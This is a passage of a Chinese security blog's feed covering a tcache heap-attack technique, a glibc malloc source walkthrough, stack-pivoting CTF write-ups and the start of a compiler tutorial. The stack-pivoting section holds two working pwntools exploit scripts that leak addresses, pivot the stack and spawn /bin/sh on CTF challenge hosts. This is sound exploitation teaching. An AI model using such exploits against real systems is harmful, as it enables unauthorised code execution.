alt="image-20210318154115014"></p><p>可以看到栈上的地址已经上了cache链，直接分配就行了</p><p><img src="/2021/03/08/tcache/image-20210318154918326.png" alt="image-20210318154918326"></p><blockquote><p>为什么会这样？</p><p>先看这个smallbin的结构</p><p><img src="/2021/03/08/tcache/image-20210318164858035.png" alt="image-20210318164858035"></p><p>之后我们把2的bk指针改为栈上的地址。</p><p>calloc之后就成为了这样</p><p><img src="/2021/03/08/tcache/image-20210318165216882.png" alt="image-20210318165216882"></p><p>这里说明一下为什么要使用calloc进行申请chunk，这是<strong>因为calloc在申请chunk的时候不会从tcache bin中摘取空闲块</strong>，如果这里使用malloc的话就会直接从tcache bin中获得空闲块了。那么在calloc申请size为0xa0大小的chunk的时候就会直接从small bin中获取，那么由于small bin是FIFO先进先出机制，所以这里被重新启用的是chunk[0]</p><p>这个时候就到了前面理论部分描述的内容了：在获取到一个smallbin中的一个 chunk 后会如果 tcache 仍有足够空闲位置（tcache中有两个位置，chunk[2]和stack_var刚好够落在这两个位置），剩下的 smallbin 从最后一个 stack_var开始顺着bk链接到 tcachebin 中 ，在这个过程中<strong>只对第一个 chunk[2]进行了完整性检查，后面的stack_var的检查缺失</strong>。这样一来就造成上图的效果，stack_var就被挂进了tcache bin的链表中</p><p><strong>同时这里还写入了一个libc，位于0x00007fffffffded0+0x10</strong></p><p><img src="/2021/03/08/tcache/image-20210318174356049.png" alt="image-20210318174356049"></p></blockquote><h2 id="5-libc-leak"><a href="#5-libc-leak" class="headerlink" title="5.libc leak"></a>5.libc leak</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>* t[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> *a=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">long</span> *b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        t[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(t[i]);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;down的wiki，便于自己多看。主要梳理一下结构。&lt;/p&gt;
&lt;h1 id=&quot;0x01-Introduction&quot;&gt;&lt;a href=&quot;#0x01-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x01 Introduction&quot;&gt;&lt;/a&gt;0</summary>
      
    
    
    
    
    <category term="heap" scheme="https://pz1o.top/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>house of系列</title>
    <link href="https://pz1o.top/2021/03/06/house-of%E7%B3%BB%E5%88%97/"/>
    <id>https://pz1o.top/2021/03/06/house-of%E7%B3%BB%E5%88%97/</id>
    <published>2021-03-06T03:15:29.000Z</published>
    <updated>2021-03-06T03:15:29.204Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>malloc源码详解</title>
    <link href="https://pz1o.top/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/"/>
    <id>https://pz1o.top/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/</id>
    <published>2021-03-05T13:49:53.000Z</published>
    <updated>2021-03-05T15:12:52.279Z</updated>
    
    <content type="html"><![CDATA[<p>这个地址可以看源码</p><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_malloc" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_malloc</a></p><h1 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h1><ul><li>当我们在应用层调用malloc申请堆的时候，在glibc中实际上调用的是_lib_malloc函数，但是_lib_malloc函数只是用来简单的封装_int_malloc函数的，_int_malloc函数才是申请堆的核心函数</li><li>_int_malloc会根据应用层用户申请的内存块大小，从而分配相应的chunk给用户使用</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到主要是_int_malloc在分配</p><h2 id="0x1-int-malloc"><a href="#0x1-int-malloc" class="headerlink" title="0x1 _int_malloc"></a>0x1 _int_malloc</h2><h3 id="1-相关变量"><a href="#1-相关变量" class="headerlink" title="1.相关变量"></a>1.相关变量</h3><p><img src="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20210305221308955.png" alt="image-20210305221308955"></p><h3 id="2-检查arena"><a href="#2-检查arena" class="headerlink" title="2.检查arena"></a>2.检查arena</h3><p><img src="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20210305221522697.png" alt="image-20210305221522697"></p><p>如果没有arena，就去系统调用mmap申请内存</p><h3 id="3-检查fastbins"><a href="#3-检查fastbins" class="headerlink" title="3.检查fastbins"></a>3.检查fastbins</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);<span class="comment">//获取索引号</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//取到堆块</span></span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;<span class="comment">//赋值victim</span></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = victim-&gt;fd;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            REMOVE_FB (fb, pp, victim);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">                malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">              check_remalloced_chunk (av, victim, nb);<span class="comment">//检测freechunk的size最低位为1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">              <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">                 stash them in the tcache.  */</span></span><br><span class="line">              <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">              <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">                &#123;</span><br><span class="line">                  mchunkptr tc_victim;</span><br><span class="line">                  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">                  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                         &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">                        *fb = tc_victim-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">                          <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                      tcache_put (tc_victim, tc_idx);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>__builtin_expect(EXP, N)</code></p><p>EXP==N的概率很大。通常定义为宏的形式，通过这种方式，编译器在编译过程中，会将可能性更大的代码紧跟着前面的代码，从而减少指令跳转带来的性能上的下降。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;#define likely(x) __builtin_expect(!!(x), 1) &#x2F;&#x2F;x很可能为真       </span><br><span class="line">&gt;#define unlikely(x) __builtin_expect(!!(x), 0) &#x2F;&#x2F;x很可能为假</span><br><span class="line">&gt;双!!是返回bool值</span><br></pre></td></tr></table></figure><p>使用<code>likely()</code>，执行 if 后面的语句的机会更大，使用 <code>unlikely()</code>，执行 else 后面的语句的机会更大。</p></blockquote><ol><li><p>首先第一步检测malloc大小是否属于fastbin的大小中<img src="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20210305223801268.png" alt="image-20210305223801268"></p></li><li><p>寻找可用的freechunk，如果有就获取（REMOVE_FB），如果没有就直接退出<img src="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20210305224245676.png" alt="image-20210305224245676"></p></li><li><p>同时这里还会有系统检测<img src="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20210305224935000.png" alt="image-20210305224935000"></p><blockquote><p><img src="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20210305225057539.png" alt="image-20210305225057539">检测1，这个我们在熟悉不过了，主要看下一个。</p><p><img src="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20210305230030705.png" alt="image-20210305230030705">看红圈位置，如果PRE_INUSE为0，程序直接就退出了</p><p><strong>这也是我们进行堆攻击时候很重要的一个点</strong>。</p></blockquote></li></ol><h3 id="4-检测smallbins"><a href="#4-检测smallbins" class="headerlink" title="4.检测smallbins"></a>4.检测smallbins</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个地址可以看源码&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_malloc&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https</summary>
      
    
    
    
    
    <category term="heap" scheme="https://pz1o.top/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>栈迁移</title>
    <link href="https://pz1o.top/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <id>https://pz1o.top/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/</id>
    <published>2021-03-02T02:39:42.000Z</published>
    <updated>2021-03-02T14:15:10.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-基本原理"><a href="#0x01-基本原理" class="headerlink" title="0x01 基本原理"></a>0x01 基本原理</h1><p>call一个函数实际进行的操作</p><blockquote><p>push eip+4;</p><p>push ebp;</p><p>mov ebp,esp;</p></blockquote><p>以保护现场，避免执行完函数后堆栈不平衡或者找不到之前的入口地址。</p><p>在执行完函数后也会进行一系列对应的操作来还原现场<code>leave;ret;</code></p><p>这边的leave就相当于进入函数栈操作的逆过程。</p><blockquote><p>leave == mov esp,ebp; pop ebp;<br>ret == pop eip #弹出栈顶数据给eip寄存器</p></blockquote><p>这样如果能够控制栈空间到任意地址，那么我们就能利用ret来控制eip的数据了（栈顶数据）</p><h1 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h1><p>主要是为了解决栈溢出可以，但溢出空间大小不足的问题（如read函数的字节限制等）</p><p>所以我们就要通过控制ebp来绕过限制。</p><h1 id="0x03-如何利用"><a href="#0x03-如何利用" class="headerlink" title="0x03 如何利用"></a>0x03 如何利用</h1><p>要想控制程序流程，我们首要控制的就是eip的值，而eip是由ret来获取的。</p><p>在不改变eip的情况下，所以我们想到的就是改变ret前面的内容。</p><p>这里就产生一个思路，如果我们能控制ebp和esp到任意位置，那么eip不也就随意控制了吗？</p><ol><li>栈溢出覆盖ebp，到指定栈顶的位置</li><li>esp确定好位置，伪造eip即可</li></ol><h1 id="0x04-例题"><a href="#0x04-例题" class="headerlink" title="0x04 例题"></a>0x04 例题</h1><h2 id="printf打印栈地址"><a href="#printf打印栈地址" class="headerlink" title="printf打印栈地址"></a>printf打印栈地址</h2><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><blockquote><p>打印只需要到ebp位置就可以</p></blockquote><p>比较基础的栈迁移的题目</p><p>我们只需要获取ebp就可以</p><p>这里需要调试一下才能看清楚情况</p><p><img src="/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302164451946.png" alt="image-20210302164451946"></p><p>两次输出 第一次获取栈地址 第二次直接构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28770</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.1")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.1"</span>)</span><br><span class="line">sys = elf.sym[<span class="string">"system"</span>]</span><br><span class="line">main = elf.sym[<span class="string">"main"</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line">pld = <span class="string">"A"</span>*<span class="number">0x27</span></span><br><span class="line">sl(pld)</span><br><span class="line">ebp = uu32(ru(<span class="string">"\xff"</span>,drop=<span class="literal">False</span>)[<span class="number">-4</span>:])</span><br><span class="line">leak(<span class="string">"ebp"</span>,ebp)</span><br><span class="line">esp = ebp - <span class="number">0x48</span></span><br><span class="line">pld = (<span class="string">b"A"</span>*<span class="number">0x4</span> + p32(sys) + p32(main) + p32(esp+<span class="number">0x20</span>) + <span class="string">"/bin/sh\x00"</span> ).ljust(<span class="number">0x28</span>,<span class="string">'A'</span>) + p32(esp+<span class="number">0x10</span>) + p32(leave_ret)</span><br><span class="line">s(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="劫持到bss段"><a href="#劫持到bss段" class="headerlink" title="劫持到bss段"></a>劫持到bss段</h2><h3 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h3><p><img src="/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302221412110.png" alt="image-20210302221412110"></p><blockquote><p>bss段上可以写，直接迁移到bss段上，然后继续write泄露，getshell</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29456</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.2")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.231.so"</span>)</span><br><span class="line">bss = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line">main = elf.sym[<span class="string">"main"</span>]</span><br><span class="line">puts = elf.sym[<span class="string">"puts"</span>]</span><br><span class="line">write_plt = elf.sym[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">pld = p32(<span class="number">0</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line">sa(<span class="string">"What is your name?"</span>,pld)</span><br><span class="line">pld = <span class="string">b"A"</span>*<span class="number">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class="line">sa(<span class="string">"What do you want to say?"</span>,pld)</span><br><span class="line">write = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc_base = write - libc.sym[<span class="string">"write"</span>]</span><br><span class="line">leak(<span class="string">"libc"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">sh = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">pld = p32(<span class="number">0</span>) + p32(sys) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line">sa(<span class="string">"What is your name?"</span>,pld)</span><br><span class="line">pld = <span class="string">b"A"</span>*<span class="number">0x18</span> + p32(bss) + p32(leave_ret)</span><br><span class="line">sa(<span class="string">"What do you want to say?"</span>,pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-基本原理&quot;&gt;&lt;a href=&quot;#0x01-基本原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本原理&quot;&gt;&lt;/a&gt;0x01 基本原理&lt;/h1&gt;&lt;p&gt;call一个函数实际进行的操作&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;push e</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>写一个编译器</title>
    <link href="https://pz1o.top/2021/02/20/%E5%86%99%E4%B8%80%E4%B8%AA%E7%BC%96%E8%AF%91%E5%99%A8/"/>
    <id>https://pz1o.top/2021/02/20/%E5%86%99%E4%B8%80%E4%B8%AA%E7%BC%96%E8%AF%91%E5%99%A8/</id>
    <published>2021-02-20T14:43:04.000Z</published>
    <updated>2021-03-03T07:34:48.654Z</updated>
    
    <content type="html"><![CDATA[<p>d当有了这个文件夹，我才有动力把它更完。</p><h1 id="0x01-设计"><a href="#0x01-设计" class="headerlink" title="0x01 设计"></a>0x01 设计</h1><h2 id="1-构建流程"><a href="#1-构建流程" class="headerlink" title="1. 构建流程"></a>1. 构建流程</h2><p>有三个步骤</p><ol><li>词法分析器，用于将字符串转化成内部的表示结构。</li><li>语法分析器，将词法分析得到的标记流（token）生成一棵语法树。</li><li>目标代码的生成，将语法树转化成目标代码。</li></ol><p>这里我们的步骤</p><ol><li>构建我们自己的虚拟机以及指令集。这后生成的目标代码便是我们的指令集。</li><li>构建我们的词法分析器</li><li>构建语法分析器</li></ol><h2 id="2-编译器框架"><a href="#2-编译器框架" class="headerlink" title="2. 编译器框架"></a>2. 编译器框架</h2><p>这里有一个单独用于解析“表达式”的函数 <code>expression</code> 是因为表达式在语法分析中相对独立并且比较复杂，所以我们将它单独作为一个模块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> token;            <span class="comment">// current token</span></span><br><span class="line"><span class="keyword">char</span> *src, *old_src;  <span class="comment">// pointer to source code string;</span></span><br><span class="line"><span class="keyword">int</span> poolsize;         <span class="comment">// default size of text/data/stack</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">line</span>;             <span class="comment">// line number</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    token = *src++;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">expression</span><span 